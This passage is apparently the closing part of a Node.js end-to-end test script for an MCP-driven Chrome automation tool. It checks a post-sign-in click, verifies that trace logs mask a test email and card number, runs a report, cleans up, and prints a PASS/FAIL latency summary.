        const waiting = mcp.call("chrome_login", { action: "wait", tab: lt, timeoutMs: 30_000 }, 60_000).then(r => ({ r }), e => ({ e }));
        await sleep(2500);
        await mcp.call("chrome_tabs", { action: "navigate", tab: lt, url: `${fixture.url}/dashboard` });
        const res = /** @type {any} */ (await waiting);
        if (!res.r || res.r.signedIn !== true) throw new Error("the wait did not end when the person was in: " + JSON.stringify(res).slice(0, 300));
        const after = await mcp.call("chrome_act", { tab: lt, selector: { identifier: "apply-promo" }, kind: "click" });
        if (after.ok === false) throw new Error("the step did not run after sign-in: " + JSON.stringify(after).slice(0, 200));
        return { walled: chk.kind, waitedMs: res.r.waitedMs, resumed: true };
      });

      await stage("trace_and_report", async () => {
        const logs = path.join(data, "logs");
        const files = fs.readdirSync(logs).filter(f => f.endsWith(".jsonl"));
        const text = files.map(f => fs.readFileSync(path.join(logs, f), "utf8")).join("");
        const lines = text.split("\n").filter(Boolean).map(l => JSON.parse(l));
        const calls = lines.filter(l => l.kind === "call");
        if (!calls.length) throw new Error("the trace has no calls");
        if (/alex@example\.com|4242424242424242/.test(text)) throw new Error("the trace holds a value that must be masked");
        const rep = spawnSync(process.execPath, [cli, "report", "--last", "1"], { env, encoding: "utf8" });
        if (rep.status !== 0) throw new Error("report failed: " + rep.stderr);
        return { calls: calls.length, withStrategy: calls.filter(c => c.strategy !== undefined).length, failures: calls.filter(c => !c.ok).length, report: (rep.stdout || "").split("\n")[1] || "" };
      });
    }
  } catch (e) {
    out.fatal = String(/** @type {Error} */ (e).message || e);
    try { out.chromeLogTail = fs.readFileSync(path.join(tmp, "chrome.log"), "utf8").slice(-1500); } catch { /* no log */ }
  } finally {
    log("cleanup");
    stopProcess(chromeProc);
    for (const c of cleanups) try { c(); } catch { /* best effort */ }
    await within(Promise.resolve(fixture?.close()), 5000, "closing the fixture").catch(e => log(String(e.message)));
    setTimeout(() => { try { fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* best effort */ } }, 2500).unref();
  }
  const failed = Object.entries(out.stages).filter(([, v]) => /** @type {any} */ (v).ok === false).map(([k]) => k);
  out.ok = !out.fatal && failed.length === 0;
  const s = out.stages;
  const line = `chrome-standalone ${out.ok ? "PASS" : "FAIL"} ${out.os}: mcp click p50 ${s.click?.latency?.p50 ?? "n/a"} ms, 12-field fill p50 ${s.fill_12?.latency?.p50 ?? "n/a"} ms, 20-step batch one call p50 ${s.batch_20_one_call?.oneCall?.p50 ?? "n/a"} ms, GHL robust flow ${s.ghl_robust_flow?.ms ?? "n/a"} ms, Esc halt ${s.esc_halts_batch?.stopToBatchReturnMs ?? "n/a"} ms${out.ok ? "" : `; failed: ${[...failed, ...(out.fatal ? ["fatal"] : [])].join(",")}`}`;
  console.log(JSON.stringify(out, null, 2)); console.log(line);
  stepSummary(`- ${line}`);
  if (typeof args.out === "string") { fs.mkdirSync(path.dirname(path.resolve(args.out)), { recursive: true }); fs.writeFileSync(args.out, JSON.stringify(out, null, 2)); }
  process.exitCode = out.ok ? 0 : 1;
}
main().then(() => setTimeout(() => process.exit(process.exitCode || 0), 3000).unref(), e => { console.error(e); process.exit(1); });
